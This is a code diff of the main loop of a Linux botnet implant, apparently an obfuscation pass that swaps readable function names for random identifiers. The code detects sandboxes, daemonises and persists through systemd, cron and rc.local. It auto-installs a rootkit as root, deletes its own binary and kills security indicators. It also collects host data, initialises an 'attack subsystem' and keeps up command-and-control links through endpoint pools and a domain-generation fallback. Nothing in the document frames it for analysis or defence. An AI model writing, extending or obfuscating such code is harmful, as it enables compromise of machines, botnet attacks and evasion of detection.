@@ -12,11 +12,11 @@
 
 #define MAX_ENDPOINTS 64
 
-static c2ep_t  c2_pool[MAX_ENDPOINTS];
+static _qw5Ti5p  c2_pool[MAX_ENDPOINTS];
 static int      pool_size = 0;
 
 /* Free all dstr members inside pool entries */
-static void pool_clear(void)
+static void _of5JF8d(void)
 {
     int i;
     for (i = 0; i < pool_size; i++) {
@@ -27,7 +27,7 @@ static void pool_clear(void)
 }
 
 /* Check if host:port already exists in pool */
-static int pool_contains(const char* host, const char* port)
+static int _eb6zd5o(const char* host, const char* port)
 {
     int i;
     for (i = 0; i < pool_size; i++) {
@@ -39,11 +39,11 @@ static int pool_contains(const char* host, const char* port)
 }
 
 /* Append a single endpoint (copies strings). Deduplicates. Returns 0 on overflow/dup. */
-static int pool_push(const char* host, const char* port)
+static int _Ed8QW3N(const char* host, const char* port)
 {
     if (pool_size >= MAX_ENDPOINTS)
         return 0;
-    if (pool_contains(host, port))
+    if (_eb6zd5o(host, port))
         return 0;
     ds_init(&c2_pool[pool_size].host);
     ds_init(&c2_pool[pool_size].port);
@@ -54,13 +54,13 @@ static int pool_push(const char* host, const char* port)
 }
 
 /* Fisher-Yates shuffle on the pool */
-static void pool_shuffle(void)
+static void _CH7fS3o(void)
 {
     int i;
     for (i = pool_size - 1; i > 0; i--) {
         int j = (int)(urandom_u32() % (unsigned)(i + 1));
         if (i != j) {
-            c2ep_t tmp = c2_pool[i];
+            _qw5Ti5p tmp = c2_pool[i];
             c2_pool[i] = c2_pool[j];
             c2_pool[j] = tmp;
         }
@@ -68,28 +68,28 @@ static void pool_shuffle(void)
 }
 
 /* ----------------------------------------------------------------------
-   resolve_config -- resolve a config entry into pool-appendable endpoints
+   _uS2nj5n -- resolve a config entry into pool-appendable endpoints
    Returns number of endpoints appended.
    ---------------------------------------------------------------------- */
 
-static int resolve_config_into(int idx, int replace)
+static int _Km5mX7A(int idx, int replace)
 {
     strarr addrs;
     int count = 0;
     size_t i;
 
     sa_init(&addrs);
-    addrs = dialga_one(idx);
+    addrs = dH7QB8j(idx);
 
     if (replace)
-        pool_clear();
+        _of5JF8d();
 
     for (i = 0; i < sa_count(&addrs); i++) {
         dstr h, p;
         ds_init(&h);
         ds_init(&p);
-        if (parse_address(sa_get(&addrs, i), &h, &p)) {
-            pool_push(ds_cstr(&h), ds_cstr(&p));
+        if (gv4Kv3u(sa_get(&addrs, i), &h, &p)) {
+            _Ed8QW3N(ds_cstr(&h), ds_cstr(&p));
             count++;
         }
         ds_free(&h);
@@ -101,15 +101,15 @@ static int resolve_config_into(int idx, int replace)
 }
 
 /* Resolve into a fresh pool (clears first) */
-static int resolve_config(int idx)
+static int _uS2nj5n(int idx)
 {
-    return resolve_config_into(idx, 1);
+    return _Km5mX7A(idx, 1);
 }
 
 /* Append to existing pool (does not clear) */
-static int resolve_config_append(int idx)
+static int _Cr7da6Y(int idx)
 {
-    return resolve_config_into(idx, 0);
+    return _Km5mX7A(idx, 0);
 }
 
 /* ======================================================================
@@ -127,13 +127,13 @@ int main(int argc, char* argv[])
     pthread_t tid;
 
     /* 0. Capture origin tag — try argv[1] first, then ORIGIN env var */
-    ds_init(&g_origin);
+    ds_init(&_my4vH6P);
     if (argc > 1 && argv[1][0] != '-') {
-        ds_set(&g_origin, argv[1]);
+        ds_set(&_my4vH6P, argv[1]);
     } else {
         const char *env_origin = getenv("ORIGIN");
         if (env_origin && env_origin[0])
-            ds_set(&g_origin, env_origin);
+            ds_set(&_my4vH6P, env_origin);
     }
 
     /* 0b. Ignore SIGPIPE (broken socket writes must not kill the process)
@@ -142,29 +142,29 @@ int main(int argc, char* argv[])
     signal(SIGCHLD, SIG_IGN);
 
     /* 1. Sandbox detection — before anything touches disk or forks */
-    if (winnti()) {
+    if (VA3rJ6j()) {
         return 0;
     }
 
     /* 2. Daemonize */
-    stuxnet(argc, argv);
+    uQ5tH2B(argc, argv);
 
-    debug_log("main: Bot starting up...");
-    debug_log("main: Protocol version: %s", BUILD_TAG);
-    if (!ds_empty(&g_origin))
-        debug_log("main: Origin: %s", ds_cstr(&g_origin));
-    debug_log("main: No sandbox detected");
-    debug_log("main: STEP-A before revil");
+    _nS5PJ8Y("main: Bot starting up...");
+    _nS5PJ8Y("main: Protocol version: %s", ds_cstr(&_bT4ag3x));
+    if (!ds_empty(&_my4vH6P))
+        _nS5PJ8Y("main: Origin: %s", ds_cstr(&_my4vH6P));
+    _nS5PJ8Y("main: No sandbox detected");
+    _nS5PJ8Y("main: STEP-A before revil");
 
     /* 3. Single-instance lock */
-    revil_single_instance();
-    debug_log("main: STEP-B after revil");
+    Bp3Tq8Z();
+    _nS5PJ8Y("main: STEP-B after revil");
 
     /* 4. Resolve fetch URL BEFORE persistence so cron/rc.local get the IP,
        not the raw domain (which may only be resolvable via TXT/DoH). */
-    ensure_network();
+    Ng4eX6x();
     {
-        const char *url = ds_cstr(&g_fetch_url);
+        const char *url = ds_cstr(&_Xx5Rw4X);
         const char *host_start = strstr(url, "://");
         if (host_start) {
             char host[256];
@@ -179,7 +179,7 @@ int main(int argc, char* argv[])
                 memcpy(host, host_start, hlen);
                 host[hlen] = '\0';
                 if (inet_pton(AF_INET, host, &tmp) != 1) {
-                    strarr resolved = resolve_one(host);
+                    strarr resolved = Fc7FE8v(host);
                     if (sa_count(&resolved) > 0) {
                         const char *r = sa_get(&resolved, 0);
                         const char *colon = strchr(r, ':');
@@ -189,12 +189,12 @@ int main(int argc, char* argv[])
                             if (iplen > 0 && iplen < (int)sizeof(ip)) {
                                 memcpy(ip, r, iplen);
                                 ip[iplen] = '\0';
-                                ds_init(&g_fetch_url_resolved);
-                                ds_catn(&g_fetch_url_resolved, url, (size_t)(host_start - url));
-                                ds_cat(&g_fetch_url_resolved, ip);
-                                ds_cat(&g_fetch_url_resolved, host_end);
-                                debug_log("main: Fetch URL resolved: %s -> %s",
-                                          ds_cstr(&g_fetch_url), ds_cstr(&g_fetch_url_resolved));
+                                ds_init(&_my6pz2j);
+                                ds_catn(&_my6pz2j, url, (size_t)(host_start - url));
+                                ds_cat(&_my6pz2j, ip);
+                                ds_cat(&_my6pz2j, host_end);
+                                _nS5PJ8Y("main: Fetch URL resolved: %s -> %s",
+                                          ds_cstr(&_Xx5Rw4X), ds_cstr(&_my6pz2j));
                             }
                         }
                     }
@@ -205,13 +205,13 @@ int main(int argc, char* argv[])
     }
 
     /* 5. Persistence -- all methods, layered for redundancy */
-    debug_log("main: Setting up persistence...");
-    dragonfly();   /* systemd + cron */
-    fin7();        /* rc.local backup */
+    _nS5PJ8Y("main: Setting up persistence...");
+    Zp8bU5j();   /* systemd + cron */
+    Dc2YM5y();        /* rc.local backup */
 
     /* 5. Rootkit -- auto-install if .so exists on disk and we have root */
     if (getuid() == 0) {
-        rootkit_auto();
+        LG2Bv6i();
     }
 
     /* 6. Self-delete binary from disk — process stays alive in memory.
@@ -222,58 +222,58 @@ int main(int argc, char* argv[])
         if (len > 0) {
             exe_path[len] = '\0';
             if (unlink(exe_path) == 0)
-                debug_log("main: Self-deleted %s", exe_path);
+                _nS5PJ8Y("main: Self-deleted %s", exe_path);
         }
     }
 
     /* 7. Start IOC killer (background thread) */
-    killer_start();
+    HZ8hr8M();
 
     /* 7. Collect metadata */
-    mustang_panda(&g_bot_id);
-    charming_kitten(&g_arch);
-    g_ram    = revil_mem();
-    g_cpu    = revil_cpu();
-    revil_proc(&g_proc);
-    debug_log("main: Metadata -- ID:%s Arch:%s RAM:%ldMB CPU:%d Proc:%s",
-              ds_cstr(&g_bot_id), ds_cstr(&g_arch), (long)g_ram, g_cpu,
-              ds_cstr(&g_proc));
+    Ai2mW7K(&_yg5RE4m);
+    Xy5oR2j(&_dG3DF2X);
+    _GL4jD4V    = HY8cY3Q();
+    _Ym3DC2v    = un5KE2K();
+    uw2zs4U(&_ZC6YY5F);
+    _nS5PJ8Y("main: Metadata -- ID:%s Arch:%s RAM:%ldMB CPU:%d Proc:%s",
+              ds_cstr(&_yg5RE4m), ds_cstr(&_dG3DF2X), (long)_GL4jD4V, _Ym3DC2v,
+              ds_cstr(&_ZC6YY5F));
 
     /* 7. Initialize attack subsystem */
 #ifndef NO_ATTACK
-    attack_init();
-    debug_log("main: Attack subsystem initialized");
+    Hu6uf7y();
+    _nS5PJ8Y("main: Attack subsystem initialized");
 #else
-    debug_log("main: Attack code disabled (NO_ATTACK build)");
+    _nS5PJ8Y("main: Attack code disabled (NO_ATTACK build)");
 #endif
 
     /* 8. Resolve C2 addresses */
-    ensure_network();
-    num_configs = (int)sa_count(&g_service_addrs);
+    Ng4eX6x();
+    num_configs = (int)sa_count(&_zU4TP2B);
     if (num_configs == 0) {
-        debug_log("main: No C2 addresses configured, exiting");
+        _nS5PJ8Y("main: No C2 addresses configured, exiting");
         return 1;
     }
-    debug_log("main: %d C2 config entries available", num_configs);
+    _nS5PJ8Y("main: %d C2 config entries available", num_configs);
 
     /* Bootstrap: resolve first entry */
-    debug_log("main: Resolving first C2 config entry...");
-    resolve_config(0);
+    _nS5PJ8Y("main: Resolving first C2 config entry...");
+    _uS2nj5n(0);
     if (pool_size == 0) {
         int i;
         for (i = 1; i < num_configs; i++) {
-            resolve_config(i);
+            _uS2nj5n(i);
             if (pool_size > 0) break;
         }
         if (pool_size == 0) {
-            debug_log("main: No C2 addresses resolved, exiting");
+            _nS5PJ8Y("main: No C2 addresses resolved, exiting");
             return 1;
         }
     }
 
     /* Shuffle initial pool */
-    pool_shuffle();
-    debug_log("main: Starting with %d endpoints", pool_size);
+    _CH7fS3o();
+    _nS5PJ8Y("main: Starting with %d endpoints", pool_size);
 
     c2_idx            = 0;
     config_idx        = 0;
@@ -310,23 +310,23 @@ int main(int argc, char* argv[])
         if (phantom_mode && now > phantom_primary_ttl) {
             int recovered = 0;
             int i;
-            debug_log("main: Phantom mode -- retrying primary C2...");
+            _nS5PJ8Y("main: Phantom mode -- retrying primary C2...");
 
             for (i = 0; i < num_configs && !recovered; i++) {
                 /* Resolve into a temp area -- reuse pool if success */
-                c2ep_t tmp_eps[MAX_ENDPOINTS];
+                _qw5Ti5p tmp_eps[MAX_ENDPOINTS];
                 int tmp_count = 0;
                 strarr addrs;
                 size_t a;
 
                 sa_init(&addrs);
-                addrs = dialga_one(i);
+                addrs = dH7QB8j(i);
 
                 for (a = 0; a < sa_count(&addrs) && tmp_count < MAX_ENDPOINTS; a++) {
                     dstr h, p;
                     ds_init(&h);
                     ds_init(&p);
-                    if (parse_address(sa_get(&addrs, a), &h, &p)) {
+                    if (gv4Kv3u(sa_get(&addrs, a), &h, &p)) {
                         ds_init(&tmp_eps[tmp_count].host);
                         ds_init(&tmp_eps[tmp_count].port);
                         ds_set(&tmp_eps[tmp_count].host, ds_cstr(&h));
@@ -341,19 +341,19 @@ int main(int argc, char* argv[])
                 {
                     int t;
                     for (t = 0; t < tmp_count; t++) {
-                        conn_t* test = vpn_connect(ds_cstr(&tmp_eps[t].host),
+                        _EA8up4M* test = hq4zK8c(ds_cstr(&tmp_eps[t].host),
                                                    ds_cstr(&tmp_eps[t].port));
                         if (test) {
                             int k;
-                            debug_log("main: Primary C2 recovered via config[%d]!", i);
+                            _nS5PJ8Y("main: Primary C2 recovered via config[%d]!", i);
 
                             /* Replace pool with these endpoints */
-                            pool_clear();
+                            _of5JF8d();
                             for (k = 0; k < tmp_count; k++) {
-                                pool_push(ds_cstr(&tmp_eps[k].host),
+                                _Ed8QW3N(ds_cstr(&tmp_eps[k].host),
                                           ds_cstr(&tmp_eps[k].port));
                             }
-                            pool_shuffle();
+                            _CH7fS3o();
                             c2_idx           = 0;
                             config_idx       = i;
                             phantom_mode     = 0;
@@ -363,7 +363,7 @@ int main(int argc, char* argv[])
                             configs_loaded   = 1;
                             all_configs_tried = 0;
 
-                            anonymous_sudan(test); /* takes ownership */
+                            Ht7Lk2Y(test); /* takes ownership */
                             recovered = 1;
                             break;
                         }
@@ -390,9 +390,9 @@ int main(int argc, char* argv[])
 
         /* Empty pool -- wait and re-resolve */
         if (pool_size == 0) {
-            debug_log("main: Pool empty, sleeping...");
+            _nS5PJ8Y("main: Pool empty, sleeping...");
             sleep_ms(5000);
-            resolve_config(0);
+            _uS2nj5n(0);
             continue;
         }
 
@@ -401,18 +401,18 @@ int main(int argc, char* argv[])
             int ep_idx = c2_idx % pool_size;
             const char* host = ds_cstr(&c2_pool[ep_idx].host);
             const char* port = ds_cstr(&c2_pool[ep_idx].port);
-            conn_t* conn;
+            _EA8up4M* conn;
 
-            debug_log("main: Connecting to %s:%s (round %d, attempt %d/%d)...",
+            _nS5PJ8Y("main: Connecting to %s:%s (round %d, attempt %d/%d)...",
                       host, port, round, round_failures + 1, pool_size);
 
-            conn = vpn_connect(host, port);
+            conn = hq4zK8c(host, port);
             if (!conn) {
                 phantom_failures++;
                 round_failures++;
                 c2_idx++;
 
-                debug_log("main: Failed (round %d, %d/%d in round, %d total)",
+                _nS5PJ8Y("main: Failed (round %d, %d/%d in round, %d total)",
                           round, round_failures, pool_size, phantom_failures);
 
                 /* Check if we've exhausted this round (tried every endpoint) */
@@ -424,24 +424,24 @@ int main(int argc, char* argv[])
                     /* Before next round, try to expand pool from unloaded configs */
                     if (!all_configs_tried && configs_loaded < num_configs) {
                         int ci;
-                        debug_log("main: Loading remaining %d config entries...",
+                        _nS5PJ8Y("main: Loading remaining %d config entries...",
                                   num_configs - configs_loaded);
                         for (ci = configs_loaded; ci < num_configs; ci++) {
-                            resolve_config_append(ci);
+                            _Cr7da6Y(ci);
                         }
                         configs_loaded    = num_configs;
                         all_configs_tried = 1;
-                        pool_shuffle();
-                        debug_log("main: Pool expanded to %d endpoints", pool_size);
+                        _CH7fS3o();
+                        _nS5PJ8Y("main: Pool expanded to %d endpoints", pool_size);
                     } else {
-                        pool_shuffle();
+                        _CH7fS3o();
                     }
 
                     /* Check if we've exhausted all rounds → DGA */
                     if (round >= MAX_RETRY_ROUNDS) {
                         int dga_resolved = 0;
                         int di;
-                        debug_log("main: All %d rounds exhausted (%d endpoints × %d rounds = %d attempts). Walking DGA...",
+                        _nS5PJ8Y("main: All %d rounds exhausted (%d endpoints × %d rounds = %d attempts). Walking DGA...",
                                   MAX_RETRY_ROUNDS, pool_size, MAX_RETRY_ROUNDS,
                                   pool_size * MAX_RETRY_ROUNDS);
 
@@ -453,18 +453,18 @@ int main(int argc, char* argv[])
                             ds_init(&dga_port);
                             ds_init(&c2_addr);
 
-                            kyurem(di, &domain, &dga_port);
-                            debug_log("main: DGA [%d/%d]: %s",
+                            Bp6se4h(di, &domain, &dga_port);
+                            _nS5PJ8Y("main: DGA [%d/%d]: %s",
                                       di + 1, DGA_DOMAINS_PER_DAY, ds_cstr(&domain));
 
-                            c2_addr = necrozma(ds_cstr(&domain));
+                            c2_addr = xu4si4C(ds_cstr(&domain));
                             if (!ds_empty(&c2_addr)) {
                                 dstr dh, dp;
                                 ds_init(&dh);
                                 ds_init(&dp);
-                                if (parse_address(ds_cstr(&c2_addr), &dh, &dp)) {
-                                    pool_clear();
-                                    pool_push(ds_cstr(&dh), ds_cstr(&dp));
+                                if (gv4Kv3u(ds_cstr(&c2_addr), &dh, &dp)) {
+                                    _of5JF8d();
+                                    _Ed8QW3N(ds_cstr(&dh), ds_cstr(&dp));
                                     c2_idx           = 0;
                                     phantom_mode     = 1;
                                     phantom_failures = 0;
@@ -494,9 +494,9 @@ int main(int argc, char* argv[])
 
                         if (!dga_resolved) {
                             /* All DGA failed -- sleep 15 min then full restart */
-                            debug_log("main: All DGA failed, sleeping 15 minutes...");
+                            _nS5PJ8Y("main: All DGA failed, sleeping 15 minutes...");
                             sleep_ms(15 * 60 * 1000 + jitter_ms(0, 60000));
-                            resolve_config(0);
+                            _uS2nj5n(0);
                             c2_idx            = 0;
                             config_idx        = 0;
                             phantom_failures  = 0;
@@ -514,7 +514,7 @@ int main(int argc, char* argv[])
                         int jit;
                         if (backoff > RETRY_RAMP_MAX_MS) backoff = RETRY_RAMP_MAX_MS;
                         jit = (int)(backoff * 0.7 + (int)(urandom_u32() % (unsigned)(int)(backoff * 0.6 + 1)));
-                        debug_log("main: Round %d starting, backoff %d ms", round, jit);
+                        _nS5PJ8Y("main: Round %d starting, backoff %d ms", round, jit);
                         sleep_ms(jit);
                     }
                 } else {
@@ -537,9 +537,9 @@ int main(int argc, char* argv[])
             configs_loaded    = 1;
             all_configs_tried = 0;
 
-            debug_log("main: Connected to C2, starting handler");
-            anonymous_sudan(conn); /* takes ownership, closes on return */
-            debug_log("main: Handler returned, reconnecting...");
+            _nS5PJ8Y("main: Connected to C2, starting handler");
+            Ht7Lk2Y(conn); /* takes ownership, closes on return */
+            _nS5PJ8Y("main: Handler returned, reconnecting...");
             sleep_jitter(RETRY_FAST_FLOOR_MS, RETRY_FAST_CEIL_MS);
         }
     }
